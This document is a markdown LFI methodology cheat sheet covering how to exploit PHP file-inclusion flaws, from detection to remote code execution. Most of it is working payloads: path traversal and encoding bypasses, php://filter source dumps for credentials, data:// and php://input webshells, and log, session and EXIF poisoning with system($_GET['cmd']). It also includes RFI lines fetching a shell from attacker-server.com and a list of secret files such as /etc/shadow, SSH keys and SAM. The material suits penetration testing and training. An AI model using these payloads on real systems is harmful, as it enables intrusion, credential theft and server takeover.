# 📂 Local File Inclusion (LFI) Methodology

> **A complete, structured approach to finding and escalating LFI — from detection to remote code execution.**

---

<div align="center">

![Type](https://img.shields.io/badge/Vulnerability-Local%20File%20Inclusion-red?style=for-the-badge)
![Scope](https://img.shields.io/badge/Scope-File%20Params%20%7C%20Wrappers%20%7C%20RCE-orange?style=for-the-badge)
![Approach](https://img.shields.io/badge/Approach-Manual%20%2B%20Burp%20%2B%20ffuf-blue?style=for-the-badge)

</div>

---

## 📋 Table of Contents

1. [Introduction](#-introduction)
2. [Where to Find](#-where-to-find)
3. [Phase 1 — Detection & Fuzzing](#-phase-1--detection--fuzzing)
4. [Phase 2 — Basic Path Traversal](#-phase-2--basic-path-traversal)
5. [Phase 3 — Encoding & Filter Bypass](#-phase-3--encoding--filter-bypass)
6. [Phase 4 — Path Truncation & Structural Bypass](#-phase-4--path-truncation--structural-bypass)
7. [Phase 5 — PHP Wrapper Exploitation](#-phase-5--php-wrapper-exploitation)
8. [Phase 6 — LFI to RCE](#-phase-6--lfi-to-rce)
9. [Phase 7 — Remote File Inclusion (RFI)](#-phase-7--remote-file-inclusion-rfi)
10. [Phase 8 — Windows-Specific LFI](#-phase-8--windows-specific-lfi)
11. [Phase 9 — Automated Fuzzing](#-phase-9--automated-fuzzing)
12. [Phase 10 — Useful Sensitive File Targets](#-phase-10--useful-sensitive-file-targets)
13. [Summary Workflow](#️-summary-workflow)
14. [Quick Decision Tree](#-quick-decision-tree)

---

## 📖 Introduction

Local File Inclusion is an attack technique where an attacker tricks a web application into including, running, or exposing files on the web server that were never meant to be reachable — through a parameter that controls which file gets loaded/rendered.

---

## 🔍 Where to Find

```
Any endpoint that includes/loads a file based on user input:

- ?page=index.html, ?file=, ?template=, ?view=, ?doc=, ?lang=, ?include=
- Template/theme selectors (?theme=dark → theme=../../../etc/passwd)
- Language/locale switchers (?lang=en → often maps to lang/en.php)
- File download/preview endpoints (?path=, ?filename=, ?document=)
- PDF/report generators that pull in a template file by name
- Log viewers / config viewers in admin panels
- Any parameter later concatenated into include(), require(),
  file_get_contents(), fopen(), readfile(), or similar
```

---

## 🧪 Phase 1 — Detection & Fuzzing

```bash
# Start with the base parameter behaving normally, then break it
http://example.com/index.php?page=index.html
http://example.com/index.php?page=../index.html
http://example.com/index.php?page=nonexistent_file_xyz

# Watch for:
#   - Different error messages (include(): failed to open stream)
#   - File path disclosure in the error (reveals webroot/OS)
#   - Behavior change between an existing vs non-existing file
```

> 💡 A verbose PHP error revealing the full include path is often the fastest way to confirm LFI and learn the webroot structure before crafting traversal payloads.

---

## 🎯 Phase 2 — Basic Path Traversal

```
http://example.com/index.php?page=../../../etc/passwd
http://example.com/index.php?page=../../../../../../../../../../../../etc/shadow
```

From a known existing subfolder (helps when traversal depth is uncertain):

```
http://example.com/index.php?page=scripts/../../../../../etc/passwd
```

---

## 🎭 Phase 3 — Encoding & Filter Bypass

### URL Encoding

```
http://example.com/index.php?page=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
```

### Double Encoding

```
http://example.com/index.php?page=%252e%252e%252f%252e%252e%252fetc%252fpasswd
```

### UTF-8 / Overlong Encoding

```
http://example.com/index.php?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
```

### Null Byte Injection (legacy PHP < 5.3.4)

```
http://example.com/index.php?page=../../../etc/passwd%00
```

### Other Obfuscation Tricks

```
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
http://example.com/index.php?page=/.%2e/.%2e/.%2e/.%2e/etc/passwd
http://example.com/index.php?page=/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd
```

> These target naive blacklist filters that strip a literal `../` once but leave a nested/encoded variant intact (e.g. `....//` becomes `../` after a single strip pass).

---

## ✂️ Phase 4 — Path Truncation & Structural Bypass

Useful against older PHP versions with `MAGIC_QUOTES_GPC` off or string-length truncation quirks:

```
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd/././.[ADD MORE]/././.
http://example.com/index.php?page=a/./.[ADD MORE]/etc/passwd
```

> Pad the `/./` segments until the resulting string hits PHP's historical path-length truncation limit (~4096 chars), which can strip a trailing extension the app force-appends (e.g. `.php`).

---

## 🌀 Phase 5 — PHP Wrapper Exploitation

### `php://filter` — Read Source Code Without Executing It

```
http://example.com/index.php?page=php://filter/read=string.rot13/resource=config.php
http://example.com/index.php?page=php://filter/convert.base64-encode/resource=config.php
```

> Base64-encoding the source is the standard move — it lets you read PHP files (like `config.php`) as text instead of having the server execute them, revealing DB credentials, API keys, etc.

### `php://filter` + `zlib` — Chained Filter for Compressed Output

```
http://example.com/index.php?page=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/shadow
```

### `zip://` — Include a File Packed Inside an Uploaded Archive

```bash
echo "<pre><?php system(\$_GET['cmd']); ?></pre>" > payload.php
zip payload.zip payload.php
mv payload.zip shell.jpg
rm payload.php
```

```
http://example.com/index.php?page=zip://shell.jpg%23payload.php
```

> Requires an upload feature that accepts the disguised archive (renamed to an allowed extension like `.jpg`) and an LFI that will process the `zip://` wrapper.

### `data://` — Inline Base64-Encoded Payload (no upload needed)

```
http://example.com/index.php?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+
```

> The base64 blob above decodes to `<?php system($_GET['cmd']); ?>` — requires `allow_url_include` enabled.

### `expect://` — Direct Command Execution (requires the expect extension)

```
http://example.com/index.php?page=expect://ls
```

### `php://input` — POST Body as PHP Code

```
POST /index.php?page=php://input HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

<?php system($_GET['cmd']); ?>
```

Then trigger it:

```
http://example.com/index.php?page=php://input&cmd=id
```

---

## 🔥 Phase 6 — LFI to RCE

When wrappers aren't available (`allow_url_include=Off`), pivot to poisoning a file the server already writes to disk, then include it.

### 6.1 — Log Poisoning (Apache/Nginx access log)

```bash
# Step 1: inject PHP into a log-recorded field, e.g. User-Agent
curl -A "<?php system(\$_GET['cmd']); ?>" http://example.com/

# Step 2: include the log file that recorded the request
http://example.com/index.php?page=../../../../var/log/apache2/access.log&cmd=id
http://example.com/index.php?page=../../../../var/log/nginx/access.log&cmd=id
```

### 6.2 — PHP Session File Poisoning

```bash
# Step 1: set a session value the app reflects verbatim into the session file
curl -c cookies.txt "http://example.com/index.php?lang=<?php system(\$_GET['cmd']); ?>"

# Step 2: locate and include the session file (default path/name pattern)
http://example.com/index.php?page=../../../../var/lib/php/sessions/sess_<SESSIONID>&cmd=id
```

### 6.3 — Mail-Based Poisoning (SMTP/PHP mail logs)

```
1. Find a feature that lets you control content later written to a
   mail-server log (e.g. a "contact us" form processed by sendmail)
2. Inject PHP payload into a field, submit
3. Include the resulting mail log:
     ?page=../../../../var/log/mail.log
```

### 6.4 — `/proc/self/environ` Poisoning (older Apache + mod_php)

```bash
curl -A "<?php system(\$_GET['cmd']); ?>" http://example.com/
```
```
http://example.com/index.php?page=../../../../proc/self/environ&cmd=id
```

### 6.5 — Upload-Based LFI to RCE

```
1. Find any upload feature (avatar, attachment, import file) even if
   it's restricted to images/CSVs/etc.
2. Embed a PHP payload inside a permitted file type (e.g. GIF with
   PHP appended, or EXIF metadata field: comment/UserComment)
3. Include the uploaded file's path via the LFI parameter
```

```bash
# Embed PHP payload in an image's EXIF comment
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg
```
```
http://example.com/index.php?page=../../../uploads/image.jpg&cmd=id
```

---

## 🌐 Phase 7 — Remote File Inclusion (RFI)

When the include function fetches a URL directly (requires `allow_url_include=On` and `allow_url_fopen=On`, both rare on modern PHP but still occasionally found):

```
http://example.com/index.php?page=http://attacker-server.com/shell.txt
http://example.com/index.php?page=http://attacker-server.com/shell.txt%00
http://example.com/index.php?page=//attacker-server.com/shell.txt
```

Host `shell.txt` as plain text containing:

```php
<?php system($_GET['cmd']); ?>
```

---

## 🪟 Phase 8 — Windows-Specific LFI

```
http://example.com/index.php?page=..\..\..\..\windows\win.ini
http://example.com/index.php?page=..%5c..%5c..%5cwindows%5cwin.ini
http://example.com/index.php?page=C:\Windows\System32\drivers\etc\hosts
http://example.com/index.php?page=....\\....\\....\\windows\\win.ini
```

---

## 🤖 Phase 9 — Automated Fuzzing

🛠️ Tools: [ffuf](https://github.com/ffuf/ffuf), [LFISuite](https://github.com/D35m0nd142/LFISuite), [SecLists LFI wordlists](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)

```bash
# ffuf against the vulnerable parameter with a dedicated LFI wordlist
ffuf -u "http://example.com/index.php?page=FUZZ" \
     -w /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt \
     -mc 200 -fs <baseline_size> -o ffuf_lfi.json -of json

# Try Windows-targeted wordlist if the OS is uncertain/Windows-hinted
ffuf -u "http://example.com/index.php?page=FUZZ" \
     -w /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt \
     -mc 200 -fs <baseline_size>

# Fuzz the parameter NAME itself when unknown (common LFI param names)
ffuf -u "http://example.com/index.php?FUZZ=../../../etc/passwd" \
     -w params_wordlist.txt -mc 200 -fs <baseline_size>
```

```bash
# LFISuite — semi-automated LFI scan + shell
python3 lfisuite.py
# then supply target URL and vulnerable parameter when prompted
```

---

## 🎯 Phase 10 — Useful Sensitive File Targets

```
# Linux
/etc/passwd
/etc/shadow
/etc/hosts
/etc/issue
/proc/self/environ
/proc/self/cmdline
/proc/version
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/nginx/access.log
/var/log/auth.log
/root/.bash_history
/home/*/.ssh/id_rsa
/var/www/html/config.php
/var/www/html/.env
/var/www/html/wp-config.php

# Windows
C:\Windows\win.ini
C:\Windows\System32\drivers\etc\hosts
C:\inetpub\logs\LogFiles\
C:\xampp\apache\logs\access.log
C:\Windows\System32\config\SAM
C:\Windows\repair\SAM
```

---

## ⚔️ Summary Workflow

```
┌──────────────────────────────────────────────────────┐
│                    LFI WORKFLOW                        │
├──────────────────────────────────────────────────────┤
│                                                        │
│  1. 🧪 Detect (baseline vs traversal vs invalid file) │
│            ↓                                          │
│  2. 🎯 Basic Traversal (../../../etc/passwd)          │
│            ↓                                          │
│  3. 🎭 Encoding Bypass (URL/double/UTF-8/null byte)   │
│            ↓                                          │
│  4. ✂️ Path Truncation (older PHP length quirks)      │
│            ↓                                          │
│  5. 🌀 PHP Wrappers (filter/zip/data/expect/input)    │
│            ↓                                          │
│  6. 🔥 LFI → RCE (log/session/mail/upload poisoning)  │
│            ↓                                          │
│  7. 🌐 Check for RFI (allow_url_include=On)           │
│            ↓                                          │
│  8. 🪟 Windows-Specific Payloads if applicable        │
│            ↓                                          │
│  9. 🤖 Automate with ffuf/LFISuite for coverage       │
│            ↓                                          │
│ 10. 📝 Document & Report                              │
│                                                        │
└──────────────────────────────────────────────────────┘
```

---

## 🧠 Quick Decision Tree

```
Parameter reflects a file-not-found style error?
    ├── YES → confirm with ../../../etc/passwd → basic LFI confirmed
    │
    ├── Payload gets stripped/filtered? → try encoding bypass (Phase 3)
    │                                     → try truncation tricks (Phase 4)
    │
    ├── php://filter accessible? → dump source (config.php, .env, etc.)
    │                               for credentials/secrets
    │
    ├── allow_url_include enabled? → RFI: host shell.txt remotely (Phase 7)
    │
    ├── No wrappers, no RFI? → pivot to poisoning:
    │       ├── Can control User-Agent/Referer logged by server? → log poisoning
    │       ├── Can set session values reflected verbatim? → session poisoning
    │       ├── Any upload feature, even restricted? → upload + LFI combo
    │       └── Mail-triggering form available? → mail log poisoning
    │
    └── Nothing manual works? → automate with ffuf + SecLists LFI wordlists
```

---

### 📚 Resources

- 🔗 [Aptive — LFI Testing](https://www.aptive.co.uk/blog/local-file-inclusion-lfi-testing/)
- 🔗 [PayloadsAllTheThings — File Inclusion](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)
- 🔗 [SecLists — LFI Wordlists](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)
- 🔗 [HackTricks — LFI/RFI](https://book.hacktricks.xyz/pentesting-web/file-inclusion)
- Companion docs: `recon.md`, `API-Testing-Methodology.md`, `SQL-Injection.md`

---

<div align="center">

### 🔥 Traverse the path. Read the source. Poison your way to RCE.

---

*Happy Hacking — responsibly and ethically* 🛡️

</div>
